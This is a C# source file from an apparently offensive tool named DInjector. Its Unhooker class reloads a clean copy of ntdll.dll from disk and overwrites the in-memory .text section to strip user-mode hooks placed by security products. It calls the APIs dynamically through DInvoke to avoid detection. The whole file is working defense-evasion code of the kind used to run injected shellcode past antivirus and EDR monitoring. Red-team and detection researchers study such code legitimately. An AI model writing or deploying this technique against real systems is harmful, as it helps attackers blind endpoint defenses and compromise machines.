﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    /// <summary>
    /// Based on:
    /// https://makosecblog.com/malware-dev/dll-unhooking-csharp/
    /// https://github.com/Kara-4search/FullDLLUnhooking_CSharp/blob/main/FullDLLUnhooking/Program.cs
    /// </summary>
    class Unhooker
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool GetModuleInformation(
            IntPtr hProcess,
            IntPtr hModule,
            out MODULEINFO lpmodinfo,
            uint cb);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void CopyMemory(
            IntPtr destination,
            IntPtr source,
            uint length);

        [StructLayout(LayoutKind.Sequential)]
        public struct MODULEINFO
        {
            public IntPtr lpBaseOfDll;
            public uint SizeOfImage;
            public IntPtr EntryPoint;
        }

        private static bool getModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb)
        {
            MODULEINFO mi = new MODULEINFO();

            object[] parameters = { hProcess, hModule, mi, cb };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("psapi.dll", "GetModuleInformation", typeof(GetModuleInformation), ref parameters);

            if (!result) lpmodinfo = mi;
            lpmodinfo = (MODULEINFO)parameters[2];

            return result;
        }

        private static bool virtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            uint oldProtect = 0;

            object[] parameters = { lpAddress, dwSize, flNewProtect, oldProtect };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "VirtualProtect", typeof(VirtualProtect), ref parameters);

            if (!result) lpflOldProtect = oldProtect;
            lpflOldProtect = (uint)parameters[3];

            return result;
        }

        private static void copyMemory(IntPtr destination, IntPtr source, uint length)
        {
            object[] parameters = { destination, source, length };
            _ = DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "RtlCopyMemory", typeof(CopyMemory), ref parameters);
        }

        public static void Unhook()
        {
            try
            {
                #region Map ntdll.dll into memory

                // https://github.com/TheWover/DInvoke/blob/0530886deebd1a2e5bd8b9eb8e1d8ce87f4ca5e4/DInvoke/DInvoke/DynamicInvoke/Generic.cs#L815-L859

                // Find the path for ntdll by looking at the currently loaded module
                string NtdllPath = string.Empty;
                ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
                foreach (ProcessModule Mod in ProcModules)
                {
                    if (Mod.FileName.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase))
                    {
                        NtdllPath = Mod.FileName;
                    }
                }

                // Alloc module into memory for parsing
                IntPtr pModule = DI.ManualMap.Map.AllocateFileToMemory(NtdllPath);

                // Fetch PE meta data
                DI.Data.PE.PE_META_DATA PEINFO = DI.DynamicInvoke.Generic.GetPeMetaData(pModule);

                // Alloc PE image memory -> RW
                IntPtr BaseAddress = IntPtr.Zero;
                IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
                UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;

                IntPtr unhookedLibAddress = DI.DynamicInvoke.Native.NtAllocateVirtualMemory(
                    (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
                    DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                    DI.Data.Win32.WinNT.PAGE_READWRITE
                );

                // Write PE header to memory
                UInt32 BytesWritten = DI.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), unhookedLibAddress, pModule, SizeOfHeaders);

                // Write sections to memory
                foreach (DI.Data.PE.IMAGE_SECTION_HEADER section in PEINFO.Sections)
                {
                    // Calculate offsets
                    IntPtr pVirtualSectionBase = (IntPtr)((UInt64)unhookedLibAddress + section.VirtualAddress);
                    IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + section.PointerToRawData);

                    // Write data
                    BytesWritten = DI.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, section.SizeOfRawData);
                    if (BytesWritten != section.SizeOfRawData)
                    {
                        throw new InvalidOperationException("Failed to write to memory.");
                    }
                }

                #endregion

                var hModule = IntPtr.Zero;

                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                    if (module.ModuleName == "ntdll.dll")
                    {
                        hModule = module.BaseAddress;
                        break;
                    }

                MODULEINFO mi = new MODULEINFO();
                getModuleInformation(Process.GetCurrentProcess().Handle, hModule, out mi, (uint)Marshal.SizeOf(mi));

                IntPtr hookedLibAddress = mi.lpBaseOfDll;
                DI.Data.PE.IMAGE_DOS_HEADER idh = (DI.Data.PE.IMAGE_DOS_HEADER)Marshal.PtrToStructure(hookedLibAddress, typeof(DI.Data.PE.IMAGE_DOS_HEADER));

                IntPtr ih64Address = hookedLibAddress + (int)idh.e_lfanew;
                DI.Data.PE.IMAGE_NT_HEADER64 ih64 = (DI.Data.PE.IMAGE_NT_HEADER64)Marshal.PtrToStructure(ih64Address, typeof(DI.Data.PE.IMAGE_NT_HEADER64));

                IntPtr ifhAddress = (IntPtr)(ih64Address + Marshal.SizeOf(ih64.Signature));
                DI.Data.PE.IMAGE_FILE_HEADER ifh = (DI.Data.PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure(ifhAddress, typeof(DI.Data.PE.IMAGE_FILE_HEADER));

                IntPtr ishAddress = (hookedLibAddress + (int)idh.e_lfanew + Marshal.SizeOf(typeof(DI.Data.PE.IMAGE_NT_HEADER64)));
                DI.Data.PE.IMAGE_SECTION_HEADER ish = new DI.Data.PE.IMAGE_SECTION_HEADER();

                for (int i = 0; i < ifh.NumberOfSections; i++)
                {
                    ish = (DI.Data.PE.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(ishAddress + i * Marshal.SizeOf(ish), typeof(DI.Data.PE.IMAGE_SECTION_HEADER));

                    if (ish.Section.Contains(".text"))
                    {
                        Console.WriteLine($"(Unhooker) [>] Unhooking ntdll.dll!{ish.Section}");

                        IntPtr hookedSectionAddress = IntPtr.Add(hookedLibAddress, (int)ish.VirtualAddress);
                        IntPtr unhookedSectionAddress = IntPtr.Add(unhookedLibAddress, (int)ish.VirtualAddress);

                        uint oldProtect = 0;
                        _ = virtualProtect(hookedSectionAddress, (UIntPtr)ish.VirtualSize, DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE, out oldProtect);

                        copyMemory(hookedSectionAddress, unhookedSectionAddress, ish.VirtualSize);

                        _ = virtualProtect(hookedSectionAddress, (UIntPtr)ish.VirtualSize, oldProtect, out uint _);

                        break;
                    }
                }

                #region Free ntdll.dll mapping allocations

                // https://github.com/TheWover/DInvoke/blob/0530886deebd1a2e5bd8b9eb8e1d8ce87f4ca5e4/DInvoke/DInvoke/DynamicInvoke/Generic.cs#L887-L891

                Marshal.FreeHGlobal(pModule);
                RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;

                DI.DynamicInvoke.Native.NtFreeVirtualMemory((IntPtr)(-1), ref unhookedLibAddress, ref RegionSize, DI.Data.Win32.Kernel32.MEM_RELEASE);

                #endregion
            }
            catch (Exception e)
            {
                Console.WriteLine($"(Unhooker) [x] {e.Message}");
                Console.WriteLine($"(Unhooker) [x] {e.InnerException}");
            }
        }
    }
}
